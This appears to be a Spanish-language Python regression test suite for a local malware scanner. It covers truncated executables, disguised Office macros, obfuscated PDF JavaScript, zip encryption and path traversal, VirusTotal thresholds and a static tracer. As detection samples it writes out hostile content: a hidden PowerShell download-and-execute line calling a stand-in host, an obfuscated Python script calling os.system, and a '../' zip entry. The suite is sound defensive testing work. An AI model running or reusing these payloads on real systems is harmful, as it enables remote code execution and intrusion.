"""Regresiones de la revisión del motor: robustez, falsos negativos y privacidad."""
import os
import queue
import shutil
import sys
import tempfile
import time
import zipfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
sys.stdout.reconfigure(encoding="utf-8")

from core import scoring, tracer
from core import watcher as W
from core.analyzer import analyze
from engines import virustotal
from tools.make_samples import make_docx

ROOT = Path(__file__).resolve().parent.parent
tmp = Path(tempfile.mkdtemp(prefix="sentinel-robust-"))


def check(label, got, expected):
    assert got == expected, f"{label}: esperado {expected}, obtenido {got}"
    print(f"OK  {label} -> {got}")


def rules(result):
    return {f.get("rule_id") for f in result["findings"]}


# ── 1. Un archivo hostil no tumba el análisis ──
deep = tmp / "deep.py"
deep.write_text("x = 1" + "+1" * 4000 + "\n", encoding="utf-8")
r = analyze(str(deep))
check("expresión anidada: no lanza y queda en revisar", r["estado"], "pendiente")
check("expresión anidada: explica el motivo", bool(r.get("errors")), True)

# ── 2. Fallar no es «seguro» ──
for size in (64, 600):
    p = tmp / f"trunc_{size}.exe"
    p.write_bytes(Path(r"C:\Windows\System32\notepad.exe").read_bytes()[:size])
    r = analyze(str(p), online=False)
    check(f"exe truncado a {size} B no es seguro", r["estado"], "pendiente")
    check(f"exe truncado a {size} B informa el error", bool(r.get("errors")), True)

# ── 3. El vigilante sobrevive a una excepción y no acumula pendientes ──
original = W.analyze
calls = {"n": 0}


def flaky(path, online=False, **kw):
    calls["n"] += 1
    if calls["n"] == 1:
        raise MemoryError("simulado")
    return original(path, online=online, **kw)


W.analyze = flaky
q = queue.Queue()
watch_dir = tmp / "watch"
watch_dir.mkdir()
w = W.Watcher(q, watch_dir=watch_dir, online=False)
w.start()
time.sleep(0.8)
(watch_dir / "uno.txt").write_text("primero", encoding="utf-8")
time.sleep(3)
(watch_dir / "dos.txt").write_text("segundo", encoding="utf-8")
(watch_dir / "temporal.dat").write_bytes(b"x" * 10)
(watch_dir / "temporal.dat").unlink()
time.sleep(4)
entries = {}
while not q.empty():
    e = q.get()
    entries[e["archivo"]] = e
check("vigilante sigue vivo tras la excepción", w.is_alive(), True)
check("archivo que falló llega como revisar con motivo",
      (entries["uno.txt"]["estado"], bool(entries["uno.txt"].get("errors"))), ("pendiente", True))
check("el archivo siguiente sí se analiza", "dos.txt" in entries, True)
check("archivos borrados no quedan pendientes", len(w.handler.pending), 0)
w.stop()
W.analyze = original

# ── 4. Office por contenido, no por extensión ──
docx = make_docx(tmp / "base.docx")
for ext in (".dotm", ".xlsb", ".xlam", ".bin"):
    p = tmp / f"macro{ext}"
    shutil.copy(docx, p)
    check(f"macro con extensión {ext} se detecta", "vba_macro" in rules(analyze(str(p), online=False)), True)

# ── 5. PDF con nombres ofuscados ──
pdf = (ROOT / "samples" / "factura_demo.pdf")
if not pdf.exists():
    from tools.make_samples import generate
    generate(ROOT / "samples")
raw = pdf.read_bytes().replace(b"/JavaScript", b"/J#61vaScript").replace(b"/OpenAction", b"/Open#41ction")
p = tmp / "ofuscado.pdf"
p.write_bytes(raw)
r = analyze(str(p), online=False)
check("pdf con #xx sigue siendo alerta", r["estado"], "alerta")
check("pdf con #xx detecta JS automático", "pdf_auto_js" in rules(r), True)

# ── 6. Scripts que no son Python ──
for name, body in (("util.ps1", "Get-ChildItem C:\\Temp | Sort-Object Length\n"),
                   ("main.c", "#include <stdio.h>\nint main(){printf(\"hi\");return 0;}\n"),
                   ("index.php", "<?php echo 'hola'; ?>\n")):
    (tmp / name).write_text(body, encoding="utf-8")
    check(f"{name} legítimo no es «revisar»", analyze(str(tmp / name))["estado"], "limpio")

(tmp / "dropper.ps1").write_text(
    "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
    "\"IEX (New-Object Net.WebClient).DownloadString('http://x.top/a')\"\n", encoding="utf-8")
check("script PowerShell hostil se detecta", analyze(str(tmp / "dropper.ps1"))["estado"], "alerta")

(tmp / "retrieval.py").write_text("def retrieval(q):\n    return q\nretrieval(1)\n", encoding="utf-8")
check("«retrieval(» no es eval()", "text:eval() dinámico" in rules(analyze(str(tmp / "retrieval.py"))), False)

(tmp / "foto.py").write_bytes(b"MZ" + b"\x00" * 200)
r = analyze(str(tmp / "foto.py"))
check("PE con extensión .py es un disfraz", (r["estado"], "disguised_pe" in rules(r)), ("alerta", True))

# ── 7. El trazador ya no ejecuta el archivo ──
marker = tmp / "marcador.txt"
made = tmp / "carpeta_creada"
evil = tmp / "evil.py"
evil.write_text(
    f"__import__('pathlib').Path(r'{marker}').write_text('x')\n"
    f"getattr(__import__('os'), 'mk' + 'dir')(r'{made}')\n"
    "import os\nos.system('whoami')\n", encoding="utf-8")
res = tracer.trace(str(evil))
check("el trazador no crea archivos", marker.exists(), False)
check("el trazador no crea carpetas", made.exists(), False)
check("el trazador sigue viendo os.system", "exec_command" in {e["evento"] for e in res["events"]}, True)
check("el trazador es estático", res.get("static"), True)
plain = tmp / "d.py"
plain.write_text("d = {}\nd.get('a')\n", encoding="utf-8")
check("dict.get no es una petición HTTP", tracer.trace(str(plain))["events"], [])

# ── 8. VirusTotal ──
os.environ.pop("VT_UPLOAD", None)
check("no se sube nada por defecto", virustotal.upload_allowed(), False)
one = virustotal._build_findings({"attributes": {"last_analysis_stats": {
    "malicious": 1, "harmless": 60, "undetected": 9}}})
check("1 detector entre 70 no es peligro", one["estado"], "pendiente")
many = virustotal._build_findings({"attributes": {"last_analysis_stats": {
    "malicious": 12, "harmless": 50, "undetected": 8}}})
check("12 detectores sí es peligro", many["estado"], "alerta")

# ── 9. Cada regla YARA es un indicio distinto ──
a = {"rule_id": "yara_match", "regla": "YARA: a", "severidad": "medio", "confianza": "media"}
b = {"rule_id": "yara_match", "regla": "YARA: b", "severidad": "medio", "confianza": "media"}
check("dos reglas YARA suman más que una",
      scoring.weighted_score([a, b]) > scoring.weighted_score([a]), True)

# ── 10. Análisis manual de archivos que el vigilante ignora ──
tmp_macro = tmp / "descarga.tmp"
shutil.copy(docx, tmp_macro)
check("el vigilante ignora .tmp", analyze(str(tmp_macro))["engine"], "skip")
check("el análisis manual (force) sí lo revisa", "vba_macro" in rules(analyze(str(tmp_macro), force=True)), True)

# ── 11. ZIP cifrado y rutas fuera de la carpeta ──
enc = tmp / "cifrado.zip"
with zipfile.ZipFile(enc, "w") as zf:
    zf.writestr("datos.txt", "hola")
blob = bytearray(enc.read_bytes())
blob[blob.index(b"PK\x01\x02") + 8] |= 0x1
enc.write_bytes(bytes(blob))
check("zip cifrado se señala", "archive_encrypted" in rules(analyze(str(enc), online=False)), True)

slip = tmp / "slip.zip"
with zipfile.ZipFile(slip, "w") as zf:
    zf.writestr("../fuera.txt", "x")
check("zip con ruta «..» se señala", "archive_traversal" in rules(analyze(str(slip), online=False)), True)

shutil.rmtree(tmp, ignore_errors=True)
print("\nTodos los casos de robustez pasaron.")
